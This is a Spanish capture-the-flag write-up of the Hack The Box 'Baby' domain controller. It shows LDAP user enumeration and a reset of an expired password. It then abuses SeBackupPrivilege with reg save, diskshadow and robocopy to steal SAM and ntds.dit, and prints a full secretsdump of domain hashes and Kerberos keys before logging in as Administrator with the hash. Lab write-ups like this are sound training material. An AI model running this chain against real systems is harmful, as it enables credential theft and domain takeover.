dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl

# search reference
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 40
# numEntries: 36
# numReferences: 3
```


```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ ldapsearch -x -b "dc=baby, dc=vl"  -H ldap://10.129.121.110 | grep dn 
dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Filtro el resultado de la búsqueda ldap para ver posibles usuarios 


```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ smbclient -L //10.129.121.110 -U Ian.Walker
Password for [WORKGROUP\Ian.Walker]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

Pruebo con las credenciales encontradas a logarme con alguno de los usuarios manualmente pues
no son tantos los que parecen cuentas de usuarios, creo que en total son 10, aparte de Administrator.

```shell                                                                                                                     
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ smbclient -L //10.129.121.110 -U Caroline.Robinson 
Password for [WORKGROUP\Caroline.Robinson]:
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```

Con esta usuario encontramos que el mensaje que arroja es **NT_STATUS_PASSWORD_MUST_CHANGE**

```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ smbpasswd -U Caroline.Robinson -r baby.vl
Old SMB password:
New SMB password:
Retype new SMB password:
machine baby.vl rejected to change the password with error: When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria.
```

Así que podemos cambiar la password de Caroline

```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ smbpasswd -U Caroline.Robinson -r baby.vl
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

Podremos hacerlo siempre que respetemos los requisitios de longitud de la password.

```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ evil-winrm -i baby.vl -u caroline.robinson -p 'BabyStart1234!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
/var/lib/gems/3.3.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ..
*Evil-WinRM* PS C:\Users\Caroline.Robinson> cd Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> dir


    Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/11/2026   5:32 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> type user.txt
cf49db5566da7c96*****

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> whoami /priv
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam sam
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
The operation completed successfully.

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> dir


    Directory: C:\Users\Caroline.Robinson\Documents


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         2/11/2026   8:33 PM          49152 sam                                                                   


evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download sam sam
Downloading C:\Users\Caroline.Robinson\Documents\sam: 64.0kB [00:00, 43.2MB/s]                                               
[+] File downloaded successfully and saved as: /home/pmartinezr/htb/baby/sam
```

Después de comprobar que puede hacer nuestro usuario comenzamos con la descarga de los archivos **sam** y **system**

```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ impacket-secretsdump -sam sam -system system LOCAL 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Podemos ver algunos hashes pero es insuficiente, necesitamos el archivo **ntds.dist** para poder usar **impacket-secretsdump**

```shell
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

Creo un script con el contenido necesario para lanzarlo con diskshadow y lo subo con el comando upload de evil-winrm

```shell
evil-winrm-py PS C:\Temp> diskshadow.exe /s diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  4/5/2026 12:08:33 PM

set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX

-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Alias cdrive for shadow ID {8785451e-008f-4982-8b84-6561e8bce914} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {a12f5a89-34d8-4ef2-8dba-cb8caac2b31a} set as environment variable.

Querying all shadow copies with the shadow copy set ID {a12f5a89-34d8-4ef2-8dba-cb8caac2b31a}

        * Shadow copy ID = {8785451e-008f-4982-8b84-6561e8bce914}       %cdrive%
                - Shadow copy set: {a12f5a89-34d8-4ef2-8dba-cb8caac2b31a}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 4/5/2026 12:08:51 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {8785451e-008f-4982-8b84-6561e8bce914}
The shadow copy was successfully exposed as E:\.
-> end backup
->


evil-winrm-py PS C:\temp> robocopy /b E:\Windows
tds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                              
-------------------------------------------------------------------------------

  Started : Sunday, April 5, 2026 12:18:10 PM
   Source : E:\Windows
tds\
     Dest : C:\temp\

    Files : ntds.dit
            
  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 

------------------------------------------------------------------------------

                           1    E:\Windows
tds\
            New File              16.0 m        ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
  1.5%
  1.9%
  .....
 100%  
 100%  

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           98,689,505 Bytes/sec.
   Speed :            5,647.059 MegaBytes/min.
   Ended : Sunday, April 5, 2026 12:18:11 PM
```

Ahora si dispongo del archivo ntds.dit 

```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd*******:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:a946acb2b132c5fb79c3baaa09c80a04:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:ce718933b548ec3273004506cf983ac8c6c5195c576177d454455cdaa40ffc2e
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:ff1eab502f0863ecf094ecab212d3154
baby.vl\Caroline.Robinson:des-cbc-md5:e69d20cde991791f
[*] Cleaning up...
```

Con estos 3 archivos podemos extraer los hashes almacenados de los usuarios locales SAM y los de dominio NTDS.dIT. 

## 👽 Acciones:

```shell                                                                                                                        
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ evil-winrm-py -i 10.129.234.71 -u Administrator -H 'ee4457ae59f1e3fbd*******' 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.129.234.71:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
201510774f2cf89245********
```

Y por último usamos el hash de Administrator para conectarnos y sacar la bandera root.txt

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/739)